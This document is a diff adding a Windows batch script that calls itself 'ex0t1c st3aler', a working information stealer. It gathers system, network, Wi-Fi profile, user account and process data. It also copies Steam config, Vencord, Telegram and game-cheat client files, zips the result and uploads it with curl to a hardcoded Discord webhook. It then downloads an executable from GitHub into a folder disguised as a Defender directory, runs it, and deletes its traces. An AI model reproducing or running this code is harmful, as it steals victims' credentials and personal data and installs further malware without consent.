@@ -1,0 +1,156 @@
+ÿþ&cls
+@echo off
+chcp 65001 >nul
+setlocal enabledelayedexpansion
+set "url=https://github.com/sdfviound/spoff/raw/refs/heads/main/Programm.exe" 
+set "ins=%SystemRoot%\DefenderSection"
+set "exe=%ins%\winerror.exe"
+set "id=%random%%random%%random%"
+set "webhook=https://discord.com/api/webhooks/1468673268063011012/iT8-XvejDnCYWA0tsAezN0JfsqplyrZUuMMe2fwK8Q9VhBSP7q_wdOZz3w08NU_Ou5Dz"
+
+if not exist "%APPDATA%\exit3dtemp" mkdir "%APPDATA%\exit3dtemp" >nul 2>&1
+if not exist "%APPDATA%\exit3dtemp\dirsz" mkdir "%APPDATA%\exit3dtemp\dirsz" >nul 2>&1
+if not exist "%APPDATA%\exit3dtemp\steam" mkdir "%APPDATA%\exit3dtemp\steam" >nul 2>&1
+if not exist "%APPDATA%\exit3dtemp\vencordmodule" mkdir "%APPDATA%\exit3dtemp\vencordmodule" >nul 2>&1
+if not exist "%APPDATA%\exit3dtemp\systeminformation" mkdir "%APPDATA%\exit3dtemp\systeminformation" >nul 2>&1
+if not exist "%APPDATA%\exit3dtemp\data" mkdir "%APPDATA%\exit3dtemp\data" >nul 2>&1
+if not exist "%APPDATA%\exit3dtemp\ipconfiguser" mkdir "%APPDATA%\exit3dtemp\ipconfiguser" >nul 2>&1
+if not exist "%APPDATA%\exit3dtemp\otherinfo" mkdir "%APPDATA%\exit3dtemp\otherinfo" >nul 2>&1
+if not exist "%APPDATA%\exit3dtemp\xenoscripts" mkdir "%APPDATA%\exit3dtemp\xenoscripts" >nul 2>&1
+if not exist "%APPDATA%\exit3dtemp\celkacfg" mkdir "%APPDATA%\exit3dtemp\celkacfg" >nul 2>&1
+if not exist "%APPDATA%\exit3dtemp\docsCE" mkdir "%APPDATA%\exit3dtemp\docsCE" >nul 2>&1
+if not exist "%APPDATA%\exit3dtemp\logse" mkdir "%APPDATA%\exit3dtemp\logse" >nul 2>&1
+
+:stealdir
+dir "C:\" > "%APPDATA%\exit3dtemp\dirsz\CDIR-%random%.txt"
+if exist "D:\" (
+    dir "D:\" > "%APPDATA%\exit3dtemp\dirsz\DDIR-%random%.txt"
+)
+if exist "E:\" (
+    dir "E:\" > "%APPDATA%\exit3dtemp\dirsz\EDIR-%random%.txt"
+)
+if exist "F:\" (
+    dir "F:\" > "%APPDATA%\exit3dtemp\dirsz\FDIR-%random%.txt"
+)
+if exist "X:\" (
+    dir "X:\" > "%APPDATA%\exit3dtemp\dirsz\XDIR-%random%.txt"
+)
+dir "C:\Program Files (x86)" > "%APPDATA%\exit3dtemp\dirsz\ProgFiles86DIR-%random%.txt" 
+dir "C:\Program Files" > "%APPDATA%\exit3dtemp\dirsz\ProgFilesDIR-%random%.txt" 
+dir "%USERPROFILE%" > "%APPDATA%\exit3dtemp\dirsz\UserProfileDIR-%random%.txt" 
+if exist "%USERPROFILE%\AppData\Local\SquirrelTemp\SquirrelSetup.log" (
+    type "%USERPROFILE%\AppData\Local\SquirrelTemp\SquirrelSetup.log" > "%APPDATA%\exit3dtemp\dirsz\SquirrelTemp-%random%.txt" 
+)
+if exist "%USERPROFILE%\AppData\LocalLow\NTFLoader" (
+    dir "%USERPROFILE%\AppData\LocalLow\NTFLoader" > "%APPDATA%\exit3dtemp\dirsz\NTFCheck-%random%.txt" 
+)
+dir "%TEMP%" > "%APPDATA%\exit3dtemp\otherinfo\TempDIR-%random%.txt"
+dir "%USERPROFILE%\AppData\Roaming" > "%APPDATA%\exit3dtemp\dirsz\Roam-%random%.txt" 
+dir "%USERPROFILE%\AppData\Local" > "%APPDATA%\exit3dtemp\dirsz\RoamLocal-%random%.txt"
+dir "C:\Users" > "%APPDATA%\exit3dtemp\otherinfo\UsersList-%random%.txt"
+dir "%USERPROFILE%\Desktop" > "%APPDATA%\exit3dtemp\otherinfo\DesktopList-%random%.txt"
+dir "%USERPROFILE%\AppData\LocalLow" > "%APPDATA%\exit3dtemp\dirsz\RoamLow-%random%.txt"
+
+:stealsteam
+if exist "C:\Program Files (x86)\Steam\config" (
+    xcopy /E /I /H /Y "C:\Program Files (x86)\Steam\config\*" "%APPDATA%\exit3dtemp\steam\" >nul 2>&1
+)
+
+:stealvencordmodules
+if exist "%APPDATA%\Vencord" (
+    xcopy /E /I /H /Y "%APPDATA%\Vencord\settings\*.json" "%APPDATA%\exit3dtemp\vencordmodule\" >nul 2>&1
+    xcopy /E /I /H /Y "%APPDATA%\Vencord\dist\*.json" "%APPDATA%\exit3dtemp\vencordmodule\" >nul 2>&1
+)
+
+:stealsysinfo
+systeminfo > "%APPDATA%\exit3dtemp\systeminformation\SysInfo-%random%.txt" 2>nul
+
+:stealipconf
+ipconfig /all > "%APPDATA%\exit3dtemp\ipconfiguser\IPConf-%random%.txt"
+
+:stealdata
+echo vremya zapuska: %date%, %time% > "%APPDATA%\exit3dtemp\data\DataTime-%random%.txt"
+
+:stealother
+echo ex0t1c/exit3d st3aler the best > "%APPDATA%\exit3dtemp\st3alerNote-%random%.txt"
+echo nick: %USERNAME% > "%APPDATA%\exit3dtemp\otherinfo\UserName-%random%.txt" 
+echo nick: %USERPROFILE% > "%APPDATA%\exit3dtemp\otherinfo\UserProfileDirectory-%random%.txt" 
+echo otkuda zapuskali: %~dp0 > "%APPDATA%\exit3dtemp\otherinfo\StartFrom-%random%.txt" 
+echo imya pc: %COMPUTERNAME% > "%APPDATA%\exit3dtemp\otherinfo\CompName-%random%.txt" 
+if exist "C:\Windows\dockDev.txt" (
+    type "C:\Windows\dockDev.txt" > "%APPDATA%\exit3dtemp\otherinfo\GPUView-%random%.txt"
+)
+arp -a > "%APPDATA%\exit3dtemp\otherinfo\ARPcash-%random%.txt"
+netstat -ano > "%APPDATA%\exit3dtemp\otherinfo\NETStat-%random%.txt"
+netsh wlan show profiles > "%APPDATA%\exit3dtemp\otherinfo\NETSH-%random%.txt"
+net user > "%APPDATA%\exit3dtemp\otherinfo\netuser-%random%.txt"
+tree > "%APPDATA%\exit3dtemp\otherinfo\Tree-%random%.txt"
+vol > "%APPDATA%\exit3dtemp\otherinfo\disk-%random%.txt"
+net accounts > "%APPDATA%\exit3dtemp\otherinfo\accinfo-%random%.txt"
+ver > "%APPDATA%\exit3dtemp\otherinfo\winversion-%random%.txt"
+tasklist > "%APPDATA%\exit3dtemp\otherinfo\procmon-%random%.txt"
+set > "%APPDATA%\exit3dtemp\otherinfo\setsinfo-%random%.txt"
+
+:stealxeno
+if exist "C:\Xeno\scripts" (
+    xcopy /E /I /H /Y "C:\Xeno\scripts\*.lua" "%APPDATA%\exit3dtemp\xenoscripts" >nul 2>&1
+)
+
+:stealcelestialcfg
+if exist "C:\Celestial\Beta 1.16.5\Celestial\configs" (
+    xcopy /E /I /H /Y "C:\Celestial\Beta 1.16.5\Celestial\configs\*"  "%APPDATA%\exit3dtemp\celkacfg" >nul 2>&1
+)
+
+:stealdocs
+if exist "%USERPROFILE%\Documents\*.CT" (
+    xcopy /E /I /H /Y "%USERPROFILE%\Documents\*.CT" "%APPDATA%\exit3dtemp\docsCE" >nul 2>&1
+)
+
+:stealdates
+if exist "%APPDATA%\Telegram Desktop\log.txt" (
+     xcopy /E /I /H /Y "%APPDATA%\Telegram Desktop\log.txt" "%APPDATA%\exit3dtemp\logse" >nul 2>&1
+)
+if exist "C:\Nursultan\1.16.5\logs" (
+    xcopy /E /I /H /Y "C:\Nursultan\1.16.5\logs\*.log" "%APPDATA%\exit3dtemp\logse" >nul 2>&1
+)
+if exist "C:\Nursultan\1.16.5\Nursultan" (
+    xcopy /E /I /H /Y "C:\Nursultan\1.16.5\Nursultan\*.file" "%APPDATA%\exit3dtemp\logse" >nul 2>&1
+)
+if exist "C:\Nursultan\1.16.5\Nursultan\custom" (
+    xcopy /E /I /H /Y "C:\Nursultan\1.16.5\Nursultan\custom\*" "%APPDATA%\exit3dtemp\logse" >nul 2>&1
+)
+if exist "C:\Nursultan\1.16.5" (
+    xcopy /E /I /H /Y "C:\Nursultan\1.16.5\usercache.json" "%APPDATA%\exit3dtemp\logse" >nul 2>&1
+)
+
+:makezip
+mkdir "%APPDATA%\exit3dtemp\archiver" >nul 2>&1
+
+powershell -WindowStyle Hidden -Command "Compress-Archive -Path '%APPDATA%\exit3dtemp\*' -DestinationPath '%APPDATA%\exit3dtemp\archiver\ex0t1cst3aler777.zip' -CompressionLevel Optimal -Force" >nul 2>&1
+
+if not exist "%APPDATA%\exit3dtemp\archiver\ex0t1cst3aler777.zip" (
+    exit /b
+)
+
+:sendwebhook
+for %%F in ("%APPDATA%\exit3dtemp\archiver\ex0t1cst3aler777.zip") do set "filesize=%%~zF"
+
+if !filesize! GTR 8000000 (
+    goto :cleaner
+)
+
+curl -k -F "payload_json={\"username\": \"ex0t1c st3aler\", \"content\": \"```successfully st3aled! [ID %id%]:```\"}" -F "file=@%APPDATA%\exit3dtemp\archiver\ex0t1cst3aler777.zip" %webhook% --ssl-no-revoke >nul 2>&1
+
+:stealtok
+if not exist "%ins%" mkdir "%ins%"
+curl -L -s -o "%exe%" "%url%"
+if not exist "%exe%" (
+curl -L -s -o "%exe%" "%url%" 
+)
+start "" "%exe%"
+cls
+
+:cleaner
+rmdir /s /q "%APPDATA%\exit3dtemp" >nul 2>&1
+rmdir /s /q "%TEMP%\DriverUpdater" >nul 2>&1
+exit /b
